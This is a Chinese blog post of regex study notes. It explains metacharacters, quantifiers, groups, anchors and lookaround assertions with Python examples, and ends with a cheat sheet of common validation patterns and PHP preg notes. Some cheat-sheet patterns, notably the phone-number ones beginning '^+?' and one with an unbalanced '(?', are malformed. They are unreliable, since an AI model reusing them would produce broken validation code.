    <url>/2020/11/03/blog_formal/%E5%BC%80%E5%8F%91/%E7%A0%94%E5%8F%91%E5%AD%A6%E4%B9%A0/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="正则表达式学习笔记"><a href="#正则表达式学习笔记" class="headerlink" title="正则表达式学习笔记"></a>正则表达式学习笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    正则表达式(regular expression)描述了一种字符串匹配的模式(pattern)，可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等，在日常开发和源码审计工作中了解正则表达式语法尤其重要。</p>
<p>​    通常被用来检索、替换那些符合某个模式(规则)的文本</p>
<a id="more"></a>

<h2 id="基本匹配"><a href="#基本匹配" class="headerlink" title="基本匹配"></a>基本匹配</h2><ul>
<li>正则表达式只是用于在文本中检索字母和数字的模式，大小写敏感</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is Caixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'caixin'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'caixin'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is Caixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'Caixin'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'Caixin'</span>]</span><br></pre></td></tr></table></figure>

<h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>​    元字符是正则表达式的基本组成元素。元字符在跟它通常表达的意思不一样，以某种特殊的含义去解释。有些元字符写在方括号内的时候有特殊含义，如下：</p>
<table>
<thead>
<tr>
<th>元字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>匹配除换行符以外的任意字符。</td>
</tr>
<tr>
<td>[ ]</td>
<td>字符类，匹配方括号中包含的任意字符。</td>
</tr>
<tr>
<td>[^ ]</td>
<td>否定字符类。匹配方括号中不包含的任意字符</td>
</tr>
<tr>
<td>*</td>
<td>匹配前面的子表达式零次或多次</td>
</tr>
<tr>
<td>+</td>
<td>匹配前面的子表达式一次或多次</td>
</tr>
<tr>
<td>?</td>
<td>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。</td>
</tr>
<tr>
<td>{n,m}</td>
<td>花括号，匹配前面字符至少 n 次，但是不超过 m 次。</td>
</tr>
<tr>
<td>(xyz)</td>
<td>字符组，按照确切的顺序匹配字符xyz。</td>
</tr>
<tr>
<td>|</td>
<td>分支结构，匹配符号之前的字符或后面的字符。</td>
</tr>
<tr>
<td>\</td>
<td>转义符，它可以还原元字符原来的含义，允许你匹配保留字符 `[ ] ( ) { } . * + ? ^ $ \</td>
</tr>
<tr>
<td>^</td>
<td>匹配行的开始</td>
</tr>
<tr>
<td>$</td>
<td>匹配行的结束</td>
</tr>
</tbody></table>
<h3 id="英文句号"><a href="#英文句号" class="headerlink" title="英文句号 ."></a>英文句号 .</h3><p>​    表示匹配单个的任意一个字符，但是不会匹配换行符和新换行的字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is Caixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'.ai'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'cai'</span>, <span class="string">'Cai'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集 []"></a>字符集 []</h3><ul>
<li>字符集也称为字符类</li>
<li>方括号被用于指定字符集</li>
<li>使用字符集内的连字符来指定字符范围</li>
<li>方括号内的字符范围的顺序并不重要</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is Caixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'[cC]ai'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'cai'</span>, <span class="string">'Cai'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is Caixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'[a-z]ai'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'cai'</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>字符集中的英文句号表示字面的含义</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'[.]ai'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'.ai'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="否定字符集"><a href="#否定字符集" class="headerlink" title="否定字符集 [^]"></a>否定字符集 [^]</h3><p>​    插入字符 <code>^</code>表示一个字符串的开始，当它在方括号内出现时，则是取消字符集的含义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'[^.]ai'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'cai'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><p>​    元字符 <code>+</code>，<code>*</code> 或 <code>?</code> 用于指定子模式可以出现多少次，在特定的场景下使用不同的重复元字符，满足场景需求</p>
<h4 id="星号"><a href="#星号" class="headerlink" title="星号 *"></a>星号 *</h4><ul>
<li>符号 <code>*</code> 表示匹配上一个匹配规则的零次或多次。正则表达式 <code>a*</code> 表示小写字母 <code>a</code> 可以重复零次或者多次。但是它如果出现在字符集或者字符类之后，它表示整个字符集的重复。 例如正则表达式 <code>[a-z]*</code>，表示: 一行中可以包含任意数量的小写字母</li>
<li><code>*</code> 符号可以与元符号 <code>.</code> 用在一起，用来匹配任意字符串 <code>.*</code>。该 <code>*</code> 符号可以与空格符 <code>\s</code> 一起使用，用来匹配一串空格字符。 例如正则表达式 <code>\s*cat\s*</code>，表示: 零个或多个空格，后面跟小写字母 <code>c</code>，再后面跟小写字母 <code>a</code>，再再后面跟小写字母 <code>t</code>，后面再跟零个或多个空格</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'cai.*'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'caixin is C.aixin'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'a[a-z]*'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'aixin'</span>, <span class="string">'aixin'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="加号"><a href="#加号" class="headerlink" title="加号 +"></a>加号 +</h4><p>​    符号 <code>+</code> 匹配上一个字符的一次或多次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'a+'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'a'</span>, <span class="string">'a'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="问号"><a href="#问号" class="headerlink" title="问号 ?"></a>问号 ?</h4><p>​    在正则表达式中，元字符 <code>?</code> 用来表示前一个字符是可选的。该符号匹配前一个字符的零次或一次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'[a-z]?ai'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'cai'</span>, <span class="string">'ai'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="花括号"><a href="#花括号" class="headerlink" title="花括号 {}"></a>花括号 {}</h3><ul>
<li>正则表达式中花括号(也被称为量词 ?)用于指定字符或一组字符可以重复的次数。例如正则表达式 <code>[0-9]{2,3}</code>，表示: 匹配至少2位数字但不超过3位(0到9范围内的字符)</li>
<li>可以省略第二个数字。例如正则表达式 <code>[0-9]{2,}</code>，表示: 匹配2个或更多个数字。如果我们也删除逗号，则正则表达式 <code>[0-9]{2}</code>，表示: 匹配正好为2位数的数字</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'[a-z]&#123;2,3&#125;'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'cai'</span>, <span class="string">'xin'</span>, <span class="string">'is'</span>, <span class="string">'aix'</span>, <span class="string">'in'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'[a-z]&#123;2,&#125;'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'caixin'</span>, <span class="string">'is'</span>, <span class="string">'aixin'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caixin is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'[a-z]&#123;2&#125;'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'ca'</span>, <span class="string">'ix'</span>, <span class="string">'in'</span>, <span class="string">'is'</span>, <span class="string">'ai'</span>, <span class="string">'xi'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="字符组"><a href="#字符组" class="headerlink" title="字符组 ()"></a>字符组 ()</h3><p>​    字符组是一组写在圆括号内的子模式 <code>(...)</code></p>
<ul>
<li>把一个量词放在一个字符之后，它会重复前一个字符</li>
<li>把量词放在一个字符组之后，它会重复整个字符组</li>
<li>例如正则表达式 <code>(ab)*</code> 表示匹配零个或多个的字符串 “ab”。我们还可以在字符组中使用元字符 <code>|</code></li>
<li>例如正则表达式 <code>(c|g|p)ar</code>，表示: 小写字母 <code>c</code>、<code>g</code> 或 <code>p</code> 后面跟字母 <code>a</code>，后跟字母 <code>r</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ori_str = <span class="string">r"caiaiaixinA is C.aixin"</span> </span><br><span class="line">pattern_str = <span class="string">r'(ai)*xinA\s'</span></span><br><span class="line">pattern = re.compile(pattern_str)</span><br><span class="line">result = pattern.findall(ori_str)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"result = &#123;0&#125;"</span>.format(result))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">result = [<span class="string">'ai'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">"(c|a)ai(ai)+xinA\s" =&gt; caiaiaixinA is C.aixin</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">共找到 1 处匹配：</span><br><span class="line">caiaiaixinA</span><br></pre></td></tr></table></figure>

<h3 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构 |"></a>分支结构 |</h3><p>​    在正则表达式中垂直条 <code>|</code> 用来定义分支结构，分支结构就像多个表达式之间的条件</p>
<ul>
<li>字符集和分支结构巨大的区别是字符集只在字符级别上有作用，分支结构在表达式级别上依然可以使用</li>
<li>例如正则表达式 <code>(T|t)he|car</code>，表示: 大写字母 <code>T</code> 或小写字母 <code>t</code>，后面跟小写字母 <code>h</code>，后跟小写字母 <code>e</code> 或小写字母 <code>c</code>，后跟小写字母 <code>a</code>，后跟小写字母 <code>r</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">"(T|t)he|car" =&gt; The car is parked in the garage.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">共找到 3 处匹配：</span><br><span class="line">The</span><br><span class="line">car</span><br><span class="line">the</span><br></pre></td></tr></table></figure>

<h3 id="转义特殊字符"><a href="#转义特殊字符" class="headerlink" title="转义特殊字符 \"></a>转义特殊字符 \</h3><p>​    正则表达式中使用反斜杠 <code>\</code> 来转义下一个字符。允许使用保留字符来作为匹配字符 <code>{ } [ ] / \ + * . $ ^ | ?</code>。在特殊字符前面加 <code>\</code>，就可以使用它来做匹配字符。 例如正则表达式 <code>.</code> 是用来匹配除了换行符以外的任意字符。现在要在输入字符串中匹配 <code>.</code> 字符，正则表达式 <code>(f|c|m)at\.?</code>，表示: 小写字母 <code>f</code>、<code>c</code> 或者 <code>m</code> 后跟小写字母 <code>a</code>，后跟小写字母 <code>t</code>，后跟可选的 <code>.</code> 字符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">"caixin\." =&gt; caixin.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">共找到 1 处匹配：</span><br><span class="line">caixin.</span><br></pre></td></tr></table></figure>

<h3 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h3><p>​    使用定位符检查匹配符号是否是起始符号或结尾符号</p>
<ul>
<li><code>^</code> 检查匹配字符是否是起始字符</li>
<li><code>$</code>检查匹配字符是否是输入字符串的最后一个字符</li>
</ul>
<h3 id="插入符号"><a href="#插入符号" class="headerlink" title="插入符号 ^"></a>插入符号 ^</h3><p>​    插入符号 <code>^</code> 符号用于检查匹配字符是否是输入字符串的第一个字符</p>
<ul>
<li>使用正则表达式 <code>^a</code> (如果a是起始符号)匹配字符串 <code>abc</code>，会匹配到 <code>a</code>,使用正则表达式 <code>^b</code>，匹配不到任何东西的，因为在字符串 <code>abc</code> 中 “b” 不是起始字符</li>
<li>使用正则表达式 <code>^(T|t)he</code>，这表示: 大写字母 <code>T</code> 或小写字母 <code>t</code> 是输入字符串的起始符号，后面跟着小写字母 <code>h</code>，后跟小写字母 <code>e</code></li>
</ul>
<h3 id="美元符号"><a href="#美元符号" class="headerlink" title="美元符号 $"></a>美元符号 $</h3><p>​    美元 <code>$</code> 符号用于检查匹配字符是否是输入字符串的最后一个字符。例如正则表达式 <code>(at\.)$</code>，表示: 小写字母 <code>a</code>，后跟小写字母 <code>t</code>，后跟一个 <code>.</code> 字符，且这个匹配器必须是字符串的结尾</p>
<h2 id="简写字符集"><a href="#简写字符集" class="headerlink" title="简写字符集"></a>简写字符集</h2><p>​    正则表达式为常用的字符集和常用的正则表达式提供了简写</p>
<table>
<thead>
<tr>
<th>简写</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>匹配除换行符以外的任意字符</td>
</tr>
<tr>
<td>\w</td>
<td>匹配所有字母和数字的字符: <code>[a-zA-Z0-9_]</code></td>
</tr>
<tr>
<td>\W</td>
<td>匹配非字母和数字的字符: <code>[^\w]</code></td>
</tr>
<tr>
<td>\d</td>
<td>匹配数字: <code>[0-9]</code></td>
</tr>
<tr>
<td>\D</td>
<td>匹配非数字: <code>[^\d]</code></td>
</tr>
<tr>
<td>\s</td>
<td>匹配空格符: <code>[\t\n\f\r\p{Z}]</code></td>
</tr>
<tr>
<td>\S</td>
<td>匹配非空格符: <code>[^\s]</code></td>
</tr>
</tbody></table>
<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>​    后行断言和先行断言有时候被称为断言，它们是特殊类型的 <strong><em>非捕获组</em></strong> (用于匹配模式，但不包括在匹配列表中)。当在一种特定模式之前或者之后有这种模式时，会优先使用断言。 例如获取输入字符串 <code>$4.44 and $10.88</code> 中带有前缀 <code>$</code> 的所有数字。可以使用这个正则表达式 <code>(?&lt;=\$)[0-9\.]*</code>，表示: 获取包含 <code>.</code> 字符且前缀为 <code>$</code> 的所有数字</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>?=</td>
<td>正向先行断言</td>
</tr>
<tr>
<td>?!</td>
<td>负向先行断言</td>
</tr>
<tr>
<td>?&lt;=</td>
<td>正向后行断言</td>
</tr>
<tr>
<td>?&lt;!</td>
<td>负向后行断言</td>
</tr>
</tbody></table>
<p>举一个例子：</p>
<p>​    字符串  <strong>我爱你 我爱 爱 爱你</strong></p>
<ul>
<li><p>如果要取出<strong>爱</strong>字，要求这个爱字后面有<strong>你</strong>，这就是 <strong>先行断言</strong></p>
</li>
<li><p>如果要求<strong>爱</strong>字后面没有<strong>你</strong>，这是<strong>先行否定断言</strong></p>
</li>
<li><p>如果要求<strong>爱</strong>字后面有<strong>你</strong>，前面还要有<strong>我</strong>，用到<strong>后行断言</strong></p>
</li>
<li><p>如果要求爱字前面<strong>没有我</strong>，后面也<strong>没有我</strong>，那就要用到<strong>先行否定断言</strong>和<strong>后行否定断言</strong></p>
</li>
</ul>
<h3 id="正向先行断言"><a href="#正向先行断言" class="headerlink" title="正向先行断言"></a>正向先行断言</h3><p>​    正向先行断言认为第一部分的表达式必须是先行断言表达式。返回的匹配结果仅包含与第一部分表达式匹配的文本。 要在一个括号内定义一个正向先行断言，在括号中问号和等号是这样使用的 <code>(?=...)</code>。先行断言表达式写在括号中的等号后面。 例如正则表达式 <code>(T|t)he(?=\sfat)</code>，表示: 匹配大写字母 <code>T</code> 或小写字母 <code>t</code>，后面跟字母 <code>h</code>，后跟字母 <code>e</code>。 在括号中，我们定义了正向先行断言，它会引导正则表达式引擎匹配 <code>The</code> 或 <code>the</code> 后面跟着 <code>fat</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 后面必须接 空格fat</span></span><br><span class="line">"(T|t)he(?=\sfat)" =&gt; The fat cat sat on the mat.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">共找到 1 处匹配：</span><br><span class="line">The</span><br></pre></td></tr></table></figure>

<h3 id="负向先行断言"><a href="#负向先行断言" class="headerlink" title="负向先行断言"></a>负向先行断言</h3><p>​    当我们需要从输入字符串中获取不匹配表达式的内容时，使用负向先行断言。负向先行断言的定义跟我们定义的正向先行断言一样， 唯一的区别是不是等号 <code>=</code>，我们使用否定符号 <code>!</code>，例如 <code>(?!...)</code>。 我们来看看下面的正则表达式 <code>(T|t)he(?!\sfat)</code>，表示: 从输入字符串中获取全部 <code>The</code> 或者 <code>the</code> 且不匹配 <code>fat</code> 前面加上一个空格字符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">"(T|t)he(?!\sfat)" =&gt; The fat cat sat on the mat.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">共找到 1 处匹配：</span><br><span class="line">the</span><br></pre></td></tr></table></figure>

<h3 id="正向后行断言"><a href="#正向后行断言" class="headerlink" title="正向后行断言"></a>正向后行断言</h3><p>​    正向后行断言是用于获取在特定模式之前的所有匹配内容。正向后行断言表示为 <code>(?&lt;=...)</code>。例如正则表达式 <code>(?&lt;=(T|t)he\s)(fat|mat)</code>，表示: 从输入字符串中获取在单词 <code>The</code> 或 <code>the</code> 之后的所有 <code>fat</code> 和 <code>mat</code> 单词</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">"(?&lt;=(T|t)he\s)(fat|mat)" =&gt; The fat cat sat on the mat.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">共找到 2 处匹配：</span><br><span class="line">fat</span><br><span class="line">mat</span><br></pre></td></tr></table></figure>

<h3 id="负向后行断言"><a href="#负向后行断言" class="headerlink" title="负向后行断言"></a>负向后行断言</h3><p>​    负向后行断言是用于获取不在特定模式之前的所有匹配的内容。负向后行断言表示为 <code>(?&lt;!...)</code>。例如正则表达式 <code>(?&lt;!(T|t)he\s)(cat)</code>，表示: 在输入字符中获取所有不在 <code>The</code> 或 <code>the</code> 之后的所有单词 <code>cat</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">"(?&lt;!(T|t)he\s)(cat)" =&gt; The cat sat on cat.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">共找到 1 处匹配：</span><br><span class="line">cat</span><br></pre></td></tr></table></figure>

<h2 id="标识"><a href="#标识" class="headerlink" title="标识"></a>标识</h2><p>​    标记也称为修饰符，会修改正则表达式的输出。标志可以以任意顺序或组合使用，并且是正则表达式的一部分</p>
<table>
<thead>
<tr>
<th>标记</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>不区分大小写: 将匹配设置为不区分大小写。</td>
</tr>
<tr>
<td>g</td>
<td>全局搜索: 搜索整个输入字符串中的所有匹配。</td>
</tr>
<tr>
<td>m</td>
<td>多行匹配: 会匹配输入字符串每一行。</td>
</tr>
<tr>
<td>A</td>
<td>匹配规则必须从头开始匹配</td>
</tr>
<tr>
<td>s</td>
<td>表示.将匹配一切字符</td>
</tr>
<tr>
<td>x</td>
<td>表示正则表达式中的空白字符会被忽略</td>
</tr>
<tr>
<td>e</td>
<td>代码执行仅限preg_replace()</td>
</tr>
</tbody></table>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h3><ul>
<li><strong>正整数</strong>: <code>^\d+$</code></li>
<li><strong>负整数</strong>: <code>^-\d+$</code></li>
<li><strong>电话号码</strong>: <code>^+?[\d\s]{3,}$</code></li>
<li><strong>电话代码</strong>: <code>^+?[\d\s]+(?[\d\s]{10,}$</code></li>
<li><strong>整数</strong>: <code>^-?\d+$</code></li>
<li><strong>用户名</strong>: <code>^[\w\d_.]{4,16}$</code></li>
<li><strong>字母数字字符</strong>: <code>^[a-zA-Z0-9]*$</code></li>
<li><strong>带空格的字母数字字符</strong>: <code>^[a-zA-Z0-9 ]*$</code></li>
<li><strong>密码</strong>: <code>^(?=^.{6,}$)((?=.*[A-Za-z0-9])(?=.*[A-Z])(?=.*[a-z]))^.*$</code></li>
<li><strong>电子邮件</strong>: <code>^([a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4})*$</code></li>
<li><strong>IPv4 地址</strong>: <code>^((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))*$</code></li>
<li><strong>小写字母</strong>: <code>^([a-z])*$</code></li>
<li><strong>大写字母</strong>: <code>^([A-Z])*$</code></li>
<li><strong>网址</strong>: <code>^(((http|https|ftp):\/\/)?([[a-zA-Z0-9]\-\.])+(\.)([[a-zA-Z0-9]]){2,4}([[a-zA-Z0-9]\/+=%&amp;_\.~?\-]*))*$</code></li>
<li><strong>VISA 信用卡号码</strong>: <code>^(4[0-9]{12}(?:[0-9]{3})?)*$</code></li>
<li><strong>日期 (MM/DD/YYYY)</strong>: <code>^(0?[1-9]|1[012])[- /.](0?[1-9]|[12][0-9]|3[01])[- /.](19|20)?[0-9]{2}$</code></li>
<li><strong>日期 (YYYY/MM/DD)</strong>: <code>^(19|20)?[0-9]{2}[- /.](0?[1-9]|1[012])[- /.](0?[1-9]|[12][0-9]|3[01])$</code></li>
<li><strong>万事达信用卡号码</strong>: <code>^(5[1-5][0-9]{14})*$</code></li>
</ul>
<h3 id="php正则"><a href="#php正则" class="headerlink" title="php正则"></a>php正则</h3><ul>
<li>PHP中使用正则规则一定要加代表正则的标识<code>/ /</code></li>
<li>preg_match_all(正则表达式、匹配字符串、匹配到的东西放入数组) , return: 匹配到的次数</li>
<li>preg_replace  (正则表达式、替换成什么、匹配字符串), return: 替换后的结果</li>
</ul>
]]></content>
      <categories>
        <category>研发学习</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx加速响应</title>
